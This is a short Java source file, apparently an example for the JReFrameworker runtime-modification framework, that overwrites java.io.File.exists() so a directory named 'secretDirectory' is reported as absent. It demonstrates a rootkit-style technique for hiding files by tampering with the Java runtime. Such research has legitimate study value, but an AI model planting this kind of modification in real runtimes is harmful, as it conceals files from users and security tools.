package java.io;

import jreframeworker.operations.annotations.jref_overwrite;
import jreframeworker.operations.interfaces.JREF_Merge;

public class HiddenDirectory extends File implements JREF_Merge {

	/**
	 * This method initializes a new <code>File</code> object to represent a
	 * file with the specified path.
	 *
	 * @param name The path name of the file
	 */
	public HiddenDirectory(String name) {
		super(name);
	}

	/**
	 * Overwrites the behavior of File.exists() to return false if
	 * the directory's name is "secretDirectory" even if the file 
	 * actually exists. Method behaves normally in all other cases.
	 */
	@jref_overwrite
	public boolean exists() {
		if (isDirectory() && getName().equals("secretDirectory")) {
			return false;
		} else {
			return super.exists();
		}
	}

}
